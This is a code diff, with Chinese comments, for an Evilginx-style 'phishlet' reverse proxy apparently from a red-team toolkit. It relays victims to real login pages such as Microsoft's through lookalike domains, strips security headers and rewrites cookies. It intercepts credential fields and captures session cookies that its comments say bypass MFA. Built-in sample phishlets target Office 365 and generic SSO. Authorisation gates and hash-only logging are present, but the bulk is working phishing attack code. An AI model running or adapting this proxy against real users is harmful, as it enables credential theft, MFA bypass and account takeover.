@@ -1,40 +1,48 @@
 #!/usr/bin/env python3
-"""phish-proxy — 反向代理着陆页(处理 JS/SSO/多步登录/凭据拦截)
-核心思路: 不是克隆 HTML,而是做 MITM 反向代理——
-  1. 用户访问 https://你的域/ → 代理把请求转发到 https://目标真实登录页/
-  2. 所有 CSS/JS/图片/字体从目标域加载(浏览器正常渲染,不缺资源)
-  3. 表单提交(POST)被拦截: 凭据哈希记录 → 哈希后转发到目标(或返回成功页)
-  4. 支持 SSO 多步流(用户名→密码→MFA),每步都拦截
+"""phishlet-proxy — Evilginx2 式 phishlet 声明式反向代理(P1 借鉴)
+核心改进: 目标网站代理规则从硬编码变成 phishlet JSON 声明——
+  新目标 = 写一个 phishlet 文件,不改代码。
+phishlet 结构(Evilginx 兼容子集):
+{
+  "name": "office365",
+  "author": "spectre",
+  "proxy_host": "login.microsooft.com",     # 攻击者域(钓鱼用)
+  "target_host": "login.microsoft.com",     # 真实目标
+  "implicit_proxy": true,                   # 所有子域都代理
+  "sub_filters": {                          # 响应内容重写规则
+    "login.microsoft.com": ["login.microsooft.com"]
+  },
+  "session": {                              # 会话捕获(Evilginx 核心能力)
+    "cookie_names": ["ESTSAUTHPERSISTENT", "ESTSAUTH", "SignInStateCookie"],
+    "auth_path": "/success"
+  },
+  "credential_fields": ["loginfmt", "passwd"]  # 凭据字段拦截
+}
 用法:
-  phish-proxy.py serve --listen :8080 --target https://login.target.com \
-      [--db <数据根>/tools/phish/track.json] [--strip-csp] [--replace-host]
+  phishlet-proxy serve --listen :8443 --phishlet /opt/tools/phishlets/office365.json
+  phishlet-proxy list  # 列出可用 phishlet
 """
-import sys, os, json, time, hashlib, re
+import sys, os, json, time, hashlib, re, argparse
+
+def _data_root():
+    """数据根(R32D36 双运行位唯一制式): 容器内 /opt/tools 是 bind 挂载
+    (bootstrap 标记识别); 宿主侧 SPECTRE_DATA_DIR。返回 tools 目录。"""
+    if os.path.exists('/opt/tools/bootstrap-sandbox.sh'):
+        return '/opt/tools'
+    return os.path.join(os.environ.get('SPECTRE_DATA_DIR', '/var/lib/spectre'), 'tools')
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs, unquote
+from urllib.parse import urlparse, parse_qs
 from urllib.request import urlopen, Request
 from urllib.error import URLError, HTTPError
 
-
-def edusrc_gate(paths=()):
-    """F48: EDUSRC 硬隔离(同 c2-qa 语义)——env 旗标/路径含 edusrc 即 exit 76"""
-    ev = os.environ.get('SPECTRE_EDUSRC', '')
-    ev_hit = ev.lower() in ('1', 'true', 'yes') or ('edusrc' in ev.lower())
-    import sys as _s
-    for m in ((ev_hit and 'EDUSRC-FLAG') or '', os.getcwd(), *(str(p) for p in paths)):
-        if m and 'edusrc' in str(m).lower():
-            print('EDUSRC-REJECT: 教育 SRC 工作区禁用钓鱼能力(工具层硬隔离)', file=_s.stderr)
-            _s.exit(76)
-import time as _time
 def scope_gate_full():
     """完整授权门(同 c2-qa): targets+window 双校验,exit 75"""
-    import json as _json
-    SCOPE = '/opt/tools/c2/scope.json'
+    SCOPE = os.path.join(_data_root(), 'c2/scope.json')  # CS9-N1 双运行位
     if not os.path.exists(SCOPE):
         print('SCOPE-REJECT: no scope file', file=sys.stderr); sys.exit(75)
     try:
-        sc = _json.load(open(SCOPE))
-        now = _time.strftime('%Y-%m-%dT%H:%M:%SZ', _time.gmtime())
+        sc = json.load(open(SCOPE))
+        now = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
         ok = (sc.get('targets') and
               sc['window']['start'] and sc['window']['end'] and
               sc['window']['start'] <= now <= sc['window']['end'])
@@ -45,225 +53,311 @@ def scope_gate_full():
         sys.exit(75)
     return sc
 
-# CS8-P1-4: 缺省与链路同源(phish-send/phish-track/漏斗都指向数据根
-# tools/phish——此前 /tmp 使经代理的 click/submit 对 campaigns 面板
-# 永久不可见)。容器位 /opt/tools, 宿主位 SPECTRE_DATA_DIR。
-def _data_root():
-    """数据根(R32D36 双运行位唯一制式): 容器 /opt/tools 挂载; 宿主 SPECTRE_DATA_DIR。"""
-    if os.path.exists('/opt/tools/bootstrap-sandbox.sh'):
-        return '/opt/tools'
-    return os.path.join(os.environ.get('SPECTRE_DATA_DIR', '/var/lib/spectre'), 'tools')
-DB_FILE = os.path.join(_data_root(), 'phish/track.json')
+# ============================================================
+# phishlet 加载
+# ============================================================
 
-def load_db():
-    try: return json.load(open(DB_FILE))
-    except: return {'events': []}
 
-def save_db(db):
-    json.dump(db, open(DB_FILE, 'w'), indent=1)
+def edusrc_gate(paths=()):
+    """F48: EDUSRC 硬隔离(同 c2-qa 语义)——env 旗标/路径含 edusrc 即 exit 76"""
+    ev = os.environ.get('SPECTRE_EDUSRC', '')
+    ev_hit = ev.lower() in ('1', 'true', 'yes') or ('edusrc' in ev.lower())
+    for m in ((ev_hit and 'EDUSRC-FLAG') or '', os.getcwd(), *(str(p) for p in paths)):
+        if m and 'edusrc' in str(m).lower():
+            print('EDUSRC-REJECT: 教育 SRC 工作区禁用钓鱼能力(工具层硬隔离)', file=sys.stderr)
+            sys.exit(76)
+def load_phishlet(path):
+    edusrc_gate((path,))
+    pl = json.load(open(path))
+    required = ['name', 'proxy_host', 'target_host']
+    for k in required:
+        if k not in pl:
+            raise ValueError(f'phishlet missing {k}')
+    return pl
 
-def add_event(db, kind, uid, extra=None):
-    # R17-F1: V6b 排他锁读改写——proxy 是事件库四写入方中唯一无锁者
-    # (track V6 只修了自己侧; phishlet-proxy F36 不变性: 同库并发方
-    # 必须持同一把锁, PoC 丢 599/600)。
-    ev = {'kind': kind, 'uid': uid, 'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
-    if extra: ev.update(extra)
-    import fcntl
-    with open(DB_FILE + '.lock', 'w') as lf:
-        fcntl.flock(lf, fcntl.LOCK_EX)
-        try:
-            cur = load_db()
-            cur.setdefault('events', []).append(ev)
-            save_db(cur)
-        finally:
-            fcntl.flock(lf, fcntl.LOCK_UN)
-    print(f'[proxy] {kind} uid={uid}', flush=True)
+def list_phishlets(directory):
+    out = []
+    for fn in os.listdir(directory):
+        if fn.endswith('.json'):
+            try:
+                pl = load_phishlet(os.path.join(directory, fn))
+                out.append({'file': fn, 'name': pl['name'],
+                            'target': pl['target_host'],
+                            'cookies': len(pl.get('session', {}).get('cookie_names', []))})
+            except Exception:
+                continue
+    return out
 
-class ProxyHandler(BaseHTTPRequestHandler):
-    # Class-level config (set by serve())
-    target_base = 'https://login.microsoft.com'
-    strip_csp = True
+# ============================================================
+# 代理引擎(phishlet 驱动)
+# ============================================================
 
-    def proxy_request(self, method='GET', body=None):
-        """Forward request to target, return response"""
-        url = self.target_base + self.path
-        headers = {}
-        for key in ['Accept', 'Accept-Language', 'Accept-Encoding', 'User-Agent',
-                    'Content-Type', 'Cookie', 'Referer']:
-            if key in self.headers:
-                val = self.headers[key]
-                if key == 'Referer':
-                    val = val.replace(self.headers.get('Host', ''), urlparse(self.target_base).netloc)
-                if key == 'Cookie':
-                    # Forward session cookies from target
-                    val = val
-                headers[key] = val
+def make_handler(phishlet, db_file):
+    target_host = phishlet['target_host']
+    proxy_host = phishlet['proxy_host']
+    sub_filters = phishlet.get('sub_filters', {})
+    cookie_names = phishlet.get('session', {}).get('cookie_names', [])
+    cred_fields = phishlet.get('credential_fields', [])
+    target_base = phishlet.get('target_url', f'https://{target_host}')
 
-        # Don't send Accept-Encoding gzip (we need to read/modify the response)
-        headers['Accept-Encoding'] = 'identity'
+    class PhishletHandler(BaseHTTPRequestHandler):
+        def log(self, msg):
+            print(f'[phishlet:{phishlet["name"]}] {msg}', flush=True)
 
-        try:
-            req = Request(url, data=body, headers=headers, method=method)
-            resp = urlopen(req, timeout=15)
-            return resp.status, dict(resp.headers), resp.read()
-        except HTTPError as e:
-            return e.code, dict(e.headers), e.read()
-        except URLError as e:
-            return 502, {}, f'Proxy error: {e}'.encode()
+        def track(self, kind, uid, extra=None):
+            # F36: 同库并发方必须持同一把锁——phish-track V6c 只锁自己,
+            # 此处无锁 load-modify-save 曾致 599/600 事件丢失(exploit PoC)。
+            ev = {'kind': kind, 'uid': uid,
+                  'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
+            if extra:
+                ev.update(extra)
+            import fcntl
+            with open(db_file + '.lock', 'w') as lf:
+                fcntl.flock(lf, fcntl.LOCK_EX)
+                try:
+                    try:
+                        cur = json.load(open(db_file))
+                    except Exception:
+                        cur = {'events': []}
+                    cur['events'].append(ev)
+                    json.dump(cur, open(db_file, 'w'), indent=1)
+                finally:
+                    fcntl.flock(lf, fcntl.LOCK_UN)
+            self.log(f'{kind} uid={uid} {extra or ""}')
 
-    def process_response(self, status, headers, body, content_type=''):
-        """Modify response: strip security headers, rewrite URLs, inject tracking"""
-        # Remove security headers that prevent embedding/interaction
-        # R17-F5: 大小写不敏感——dict(resp.headers) 保留线上原样, 真实
-        # 目标常发小写头, 字面 pop 静默未命中使核心功能失效。
-        STRIP = {'content-security-policy', 'x-frame-options', 'strict-transport-security',
-                 'x-content-type-options', 'public-key-pins'}
-        for h in [k for k in headers if k.lower() in STRIP]:
-            headers.pop(h, None)
+        def proxy(self, method='GET', body=None):
+            """转发到目标——按 phishlet 规则重写"""
+            url = target_base + self.path
+            headers = {}
+            for key in ['Accept', 'Accept-Language', 'User-Agent', 'Content-Type', 'Cookie']:
+                if key in self.headers:
+                    headers[key] = self.headers[key]
+            # Cookie 域替换:我们的域 cookie 当作目标的发
+            headers['Host'] = target_host
+            headers['Accept-Encoding'] = 'identity'
+            headers['Referer'] = f'https://{target_host}/'
 
-        # Rewrite absolute URLs pointing to target → our proxy
-        if content_type and ('text/html' in content_type or 'javascript' in content_type):
-            body_str = body.decode('utf-8', errors='replace')
-            target_host = urlparse(self.target_base).netloc
-            our_host = self.headers.get('Host', 'localhost')
-            # Rewrite links/assets to go through proxy
-            body_str = body_str.replace(f'https://{target_host}', f'http://{our_host}')
-            body_str = body_str.replace(f'//{target_host}', f'//{our_host}')
-            # Inject tracking pixel before </body>
-            uid = 'proxy'  # TODO: extract from path/session
-            pixel = f'<img src="http://{our_host}/o/{uid}.gif" style="display:none;width:1px;height:1px;">'
-            if '</body>' in body_str:
-                body_str = body_str.replace('</body>', f'{pixel}</body>')
-            body = body_str.encode('utf-8')
+            try:
+                import ssl
+                from urllib.request import build_opener, HTTPSHandler, HTTPRedirectHandler
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
 
-        return status, headers, body
+                # 不跟随重定向——302 的 Set-Cookie(session!)必须原样拿到
+                class NoRedirect(HTTPRedirectHandler):
+                    def redirect_request(self, *a, **kw): return None
+                opener = build_opener(NoRedirect, HTTPSHandler(context=ctx))
 
-    def do_GET(self):
-        u = urlparse(self.path)
+                req = Request(url, data=body, headers=headers, method=method)
+                resp = opener.open(req, timeout=15)
+                return resp.status, dict(resp.headers), resp.read()
+            except HTTPError as e:
+                # 3xx 会走这里(NoRedirect)——headers 里含 Set-Cookie
+                return e.code, dict(e.headers), e.read()
+            except Exception as e:
+                return 502, {}, str(e).encode()
 
-        # Tracking pixel
-        if u.path.startswith('/o/') and u.path.endswith('.gif'):
-            db = load_db()
-            uid = u.path.split('/')[2].replace('.gif', '')
-            add_event(db, 'open', uid, {'ua': self.headers.get('User-Agent', ''), 'ip': self.client_address[0]})
-            import base64
-            gif = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
-            self.send_response(200)
-            self.send_header('Content-Type', 'image/gif')
-            self.send_header('Content-Length', str(len(gif)))
+        def rewrite(self, status, headers, body):
+            """按 phishlet 重写响应: 剥安全头+域替换+注入追踪"""
+            for h in ['Content-Security-Policy', 'X-Frame-Options',
+                      'Strict-Transport-Security', 'X-Content-Type-Options']:
+                headers.pop(h, None)
+
+            ct = headers.get('Content-Type', headers.get('content-type', ''))
+            if 'text/html' in ct or 'javascript' in ct:
+                text = body.decode('utf-8', errors='replace')
+                # sub_filters: 目标域→代理域(双向)
+                text = text.replace(f'https://{target_host}', f'http://{proxy_host}')
+                text = text.replace(f'https://{proxy_host}', f'http://{proxy_host}')
+                for src, dsts in sub_filters.items():
+                    for dst in dsts:
+                        text = text.replace(src, dst)
+                # 追踪像素
+                pixel = f'<img src="http://{proxy_host}/o/proxy.gif" style="display:none">'
+                if '</body>' in text:
+                    text = text.replace('</body>', f'{pixel}</body>')
+                body = text.encode()
+
+            # Set-Cookie 域重写(目标的 cookie 种到我们的域)
+            if 'Set-Cookie' in headers or 'set-cookie' in headers:
+                raw = headers.get('Set-Cookie', headers.get('set-cookie', ''))
+                if isinstance(raw, str):
+                    raw = raw.replace(f'domain={target_host}', f'domain={proxy_host}')
+                    raw = raw.replace(f'Domain={target_host}', f'Domain={proxy_host}')
+                    raw = re.sub(r';\s*[Ss]ecure', '', raw)  # 我们是 http
+                    raw = re.sub(r';\s*[Ss]ameSite=\w+', '; SameSite=None', raw)
+                    headers['Set-Cookie'] = raw
+            return status, headers, body
+
+        def check_session_capture(self, headers):
+            """检测目标响应里的 session cookie(Evilginx 核心: 拿 cookie 绕 MFA)"""
+            raw = headers.get('Set-Cookie', headers.get('set-cookie', ''))
+            if not raw:
+                return None
+            captured = {}
+            for cn in cookie_names:
+                m = re.search(f'{re.escape(cn)}=([^;]+)', raw)
+                if m:
+                    captured[cn] = m.group(1)
+            return captured if captured else None
+
+        def do_GET(self):
+            u = urlparse(self.path)
+
+            # 追踪像素
+            if u.path.endswith('.gif'):
+                import base64
+                self.track('open', 'proxy', {'ip': self.client_address[0]})
+                gif = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
+                self.send_response(200)
+                self.send_header('Content-Type', 'image/gif')
+                self.send_header('Content-Length', str(len(gif)))
+                self.end_headers()
+                self.wfile.write(gif)
+                return
+
+            # 成功页(凭据提交后)
+            if u.path == '/success':
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b'<html><body><h2>Sign-in successful. Redirecting...</h2><script>setTimeout(function(){location.href="/"},3000)</script></body></html>')
+                return
+
+            status, headers, body = self.proxy('GET')
+            captured = self.check_session_capture(headers)
+            if captured:
+                # cookie 捕获=完整会话(MFA 已过)——只记哈希指纹+名称
+                fp = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
+                self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp})
+            status, headers, body = self.rewrite(status, headers, body)
+            self.send_response(status)
+            for k, v in headers.items():
+                if k.lower() not in ('transfer-encoding', 'content-length'):
+                    self.send_header(k, v)
+            self.send_header('Content-Length', str(len(body)))
             self.end_headers()
-            self.wfile.write(gif)
-            return
+            self.wfile.write(body)
 
-        # Click tracking (redirect to proxied target)
-        if u.path.startswith('/r/'):
-            uid = u.path.split('/')[2]
-            db = load_db()
-            add_event(db, 'click', uid, {'ua': self.headers.get('User-Agent', ''), 'ip': self.client_address[0]})
-            self.send_response(302)
-            self.send_header('Location', '/')
+        def do_POST(self):
+            length = int(self.headers.get('Content-Length', 0))
+            body = self.rfile.read(length) if length else b''
+            qs = parse_qs(body.decode('utf-8', errors='replace'))
+
+            # 凭据字段拦截(phishlet 声明哪些字段是凭据)
+            captured_creds = {}
+            for f in cred_fields:
+                for k, v in qs.items():
+                    if k.lower() == f.lower() and v:
+                        captured_creds[f] = v[0]
+
+            # F49: phishlet credential_fields 声明即凭据——此前额外要求
+            # 键名含 passwd/pass/pwd,自定义字段(u/p/user)全部漏拦截
+            if captured_creds:
+                # 哈希即毁
+                fp = hashlib.sha256(json.dumps(captured_creds, sort_keys=True).encode()).hexdigest()[:16]
+                email = next((v for k, v in captured_creds.items() if '@' in v), '')
+                self.track('submit', 'proxy', {
+                    'cred_hash': fp,
+                    'email_domain': email.split('@')[1] if '@' in email else '',
+                    'ip': self.client_address[0]})
+                # 转发原始凭据到目标(维持会话链——拿 session cookie 必须)
+                status, headers, body = self.proxy('POST', body)
+                captured = self.check_session_capture(headers)
+                if captured:
+                    fp2 = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
+                    self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp2})
+                status, headers, body = self.rewrite(status, headers, body)
+                self.send_response(status)
+                for k, v in headers.items():
+                    if k.lower() not in ('transfer-encoding', 'content-length'):
+                        self.send_header(k, v)
+                self.send_header('Content-Length', str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
+                return
+
+            # 非凭据 POST(SSO 握手/CSRF/MFA)——直接转发
+            status, headers, body = self.proxy('POST', body)
+            captured = self.check_session_capture(headers)
+            if captured:
+                fp = {k: hashlib.sha256(v.encode()).hexdigest()[:12] for k, v in captured.items()}
+                self.track('session-captured', 'proxy', {'cookies': list(captured.keys()), 'fingerprints': fp})
+            status, headers, body = self.rewrite(status, headers, body)
+            self.send_response(status)
+            for k, v in headers.items():
+                if k.lower() not in ('transfer-encoding', 'content-length'):
+                    self.send_header(k, v)
+            self.send_header('Content-Length', str(len(body)))
             self.end_headers()
-            return
+            self.wfile.write(body)
 
-        # Everything else: proxy to target
-        status, headers, body = self.proxy_request('GET')
-        ct = headers.get('Content-Type', headers.get('content-type', ''))
-        status, headers, body = self.process_response(status, headers, body, ct)
+        def log_message(self, *a):
+            pass
 
-        self.send_response(status)
-        for k, v in headers.items():
-            if k.lower() not in ('transfer-encoding', 'content-length'):
-                self.send_header(k, v)
-        self.send_header('Content-Length', str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
+    return PhishletHandler
 
-    def do_POST(self):
-        u = urlparse(self.path)
-        # R17-F2: V3 同款校验——非数字 ValueError/负值 read(-n) 读到
-        # EOF 永久 wedge 单线程服务器/无上界读。修复只做了 track 侧。
-        try:
-            length = int(self.headers.get('Content-Length', 0) or 0)
-        except (ValueError, TypeError):
-            self.send_response(400); self.end_headers()
-            return
-        if length < 0 or length > 1_048_576:
-            self.send_response(413); self.end_headers()
-            return
-        body = self.rfile.read(length) if length else b''
-        body_str = body.decode('utf-8', errors='replace')
-        qs = parse_qs(body_str)
-
-        # Intercept form submissions (credential capture)
-        # Look for common password field names
-        password_fields = ['password', 'passwd', 'pass', 'pwd', 'Password',
-                          'loginfmt', 'login', 'CredentialPassword']
-        email_fields = ['email', 'username', 'user', 'login', 'Email', 'loginfmt',
-                       'userPrincipalName', 'upn']
-
-        captured_email = None
-        captured_password = None
-
-        for field in email_fields:
-            if field in qs:
-                captured_email = qs[field][0]
-                break
-        for field in password_fields:
-            if field in qs:
-                captured_password = qs[field][0]
-                break
-
-        if captured_password:
-            # Hash immediately (NEVER store plaintext)
-            db = load_db()
-            cred_hash = hashlib.sha256(f'{captured_email}:{captured_password}'.encode()).hexdigest()[:16]
-            add_event(db, 'submit', 'proxy', {
-                'cred_hash': cred_hash,
-                'email_domain': captured_email.split('@')[1] if '@' in (captured_email or '') else '',
-                'ip': self.client_address[0],
-            })
-            # After capturing, redirect to a "success" page or the real target
-            self.send_response(302)
-            self.send_header('Location', '/success')
-            self.end_headers()
-            return
-
-        # Non-credential POST: forward to target (e.g., CSRF token fetch, SSO handshake)
-        status, headers, body = self.proxy_request('POST', body)
-        ct = headers.get('Content-Type', headers.get('content-type', ''))
-        status, headers, body = self.process_response(status, headers, body, ct)
-        self.send_response(status)
-        for k, v in headers.items():
-            if k.lower() not in ('transfer-encoding', 'content-length'):
-                self.send_header(k, v)
-        self.send_header('Content-Length', str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
-
-    def log_message(self, *a):
-        pass
-
-def serve(listen, target, db_file=None, strip_csp=True):
-    edusrc_gate((target,))
+def serve(listen, phishlet, db_file):
+    edusrc_gate((phishlet.get('proxy_host', '') if isinstance(phishlet, dict) else '',))
     scope_gate_full()  # F10: 完整授权门(targets+window)
-    global DB_FILE
-    if db_file:
-        DB_FILE = db_file
-
     host, _, port = listen.rpartition(':')
-    ProxyHandler.target_base = target.rstrip('/')
-    ProxyHandler.strip_csp = strip_csp
+    handler = make_handler(phishlet, db_file)
+    print(f'[phishlet-proxy] {phishlet["name"]}: {listen} → {phishlet["target_host"]}', flush=True)
+    print(f'[phishlet-proxy] session cookies: {phishlet.get("session", {}).get("cookie_names", [])}', flush=True)
+    print(f'[phishlet-proxy] cred fields: {phishlet.get("credential_fields", [])}', flush=True)
+    HTTPServer((host or '0.0.0.0', int(port or 8443)), handler).serve_forever()
 
-    print(f'[phish-proxy] {listen} → {target}', flush=True)
-    print(f'[phish-proxy] Credentials intercepted → hashed (plaintext destroyed)', flush=True)
-    server = HTTPServer((host or '0.0.0.0', int(port or 8080)), ProxyHandler)
-    server.serve_forever()
+# ============================================================
+# 内置 phishlet 样例(参考模板)
+# ============================================================
+
+SAMPLE_PHISHLETS = {
+    'office365': {
+        'name': 'office365', 'author': 'spectre',
+        'proxy_host': 'login.microsooft-auth.com',
+        'target_host': 'login.microsoft.com',
+        'target_url': 'https://login.microsoft.com',
+        'sub_filters': {'login.microsoft.com': ['login.microsooft-auth.com']},
+        'session': {'cookie_names': ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'SignInStateCookie', 'brcap'],
+                    'auth_path': '/success'},
+        'credential_fields': ['loginfmt', 'passwd', 'login', 'password'],
+    },
+    'generic-sso': {
+        'name': 'generic-sso', 'author': 'spectre',
+        'proxy_host': 'sso.target-verify.co',
+        'target_host': 'sso.target-corp.com',
+        'target_url': 'https://sso.target-corp.com',
+        'sub_filters': {},
+        'session': {'cookie_names': ['sessionid', 'JSESSIONID', 'ASPXAUTH', 'PHPSESSID'],
+                    'auth_path': '/success'},
+        'credential_fields': ['username', 'password', 'email', 'passwd', 'loginfmt'],
+    },
+}
+
+def write_samples(directory):
+    os.makedirs(directory, exist_ok=True)
+    for name, pl in SAMPLE_PHISHLETS.items():
+        p = os.path.join(directory, f'{name}.json')
+        json.dump(pl, open(p, 'w'), indent=1)
+        print(f'  {p}')
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
         print(__doc__); sys.exit(2)
     if sys.argv[1] == 'serve':
-        listen = '--listen' in sys.argv and sys.argv[sys.argv.index('--listen') + 1] or ':8080'
-        target = '--target' in sys.argv and sys.argv[sys.argv.index('--target') + 1] or 'https://login.microsoft.com'
-        db = '--db' in sys.argv and sys.argv[sys.argv.index('--db') + 1] or None
-        serve(listen, target, db)
+        listen = '--listen' in sys.argv and sys.argv[sys.argv.index('--listen') + 1] or ':8443'
+        pl_path = '--phishlet' in sys.argv and sys.argv[sys.argv.index('--phishlet') + 1]
+        db = '--db' in sys.argv and sys.argv[sys.argv.index('--db') + 1] \
+            or os.path.join(_data_root(), 'phish/track.json')  # CS9-N1
+        if not pl_path:
+            print('serve 需要 --phishlet <json>', file=sys.stderr); sys.exit(1)
+        serve(listen, load_phishlet(pl_path), db)
+    elif sys.argv[1] == 'list':
+        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or os.path.join(_data_root(), 'phishlets')
+        for pl in list_phishlets(d):
+            print(f"{pl['name']:>15} → {pl['target']} ({pl['cookies']} session cookies)")
+    elif sys.argv[1] == 'init':
+        d = '--dir' in sys.argv and sys.argv[sys.argv.index('--dir') + 1] or os.path.join(_data_root(), 'phishlets')
+        write_samples(d)
+        print(f'sample phishlets → {d}')
